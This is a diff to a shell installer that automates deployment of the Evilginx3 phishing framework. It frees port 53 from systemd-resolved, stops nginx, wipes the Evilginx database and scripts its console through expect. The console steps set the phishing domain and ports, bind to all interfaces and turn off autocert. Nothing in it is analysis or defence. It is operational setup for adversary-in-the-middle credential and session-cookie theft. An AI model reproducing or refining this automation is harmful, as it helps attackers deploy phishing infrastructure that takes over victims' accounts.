@@ -535,6 +535,19 @@ start_service() {
 configure_evilginx_integration() {
     log "Configuring Evilginx3 integration..."
 
+    # 1. Resolve Port 53 conflict (systemd-resolved)
+    if grep -q "DNSStubListener=yes" /etc/systemd/resolved.conf || ! grep -q "DNSStubListener" /etc/systemd/resolved.conf; then
+        log "Disabling systemd-resolved stub listener to free port 53..."
+        mkdir -p /etc/systemd/resolved.conf.d
+        echo -e "[Resolve]\nDNSStubListener=no" > /etc/systemd/resolved.conf.d/evilginx.conf
+        systemctl restart systemd-resolved
+    fi
+
+    # 2. Stop Nginx and clear old state to prevent port 443 bind errors and config ghosting
+    systemctl stop nginx evilginx 2>/dev/null || true
+    rm -f "$EVILGINX_DIR/evilginx.db"
+    sleep 2
+
     # Create Evilginx config from template first to prevent port 443 conflict on startup
     if [ -f "$INSTALL_DIR/templates/evilginx.yaml.tmpl" ]; then
         sed -e "s/{{.Domain}}/$DOMAIN/g" \
@@ -619,7 +632,8 @@ log_user 1
 spawn /usr/local/bin/evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets
 
 expect {
-    -re "evilginx\s+>\s?$" {
+    "version 3.3.0" {
+        expect -re "evilginx\s+>\s?$"
         send "config https_port 8443\r"
         expect -re "evilginx\s+>"
         send "config http_port 8081\r"
@@ -628,7 +642,7 @@ expect {
         expect -re "evilginx\s+>"
         send "config domain $DOMAIN\r"
         expect -re "evilginx\s+>"
-        send "config ipv4 $VPS_IP\r"
+        send "config ipv4 0.0.0.0\r"
         expect -re "evilginx\s+>"
         send "config autocert off\r"
         expect -re "evilginx\s+>"
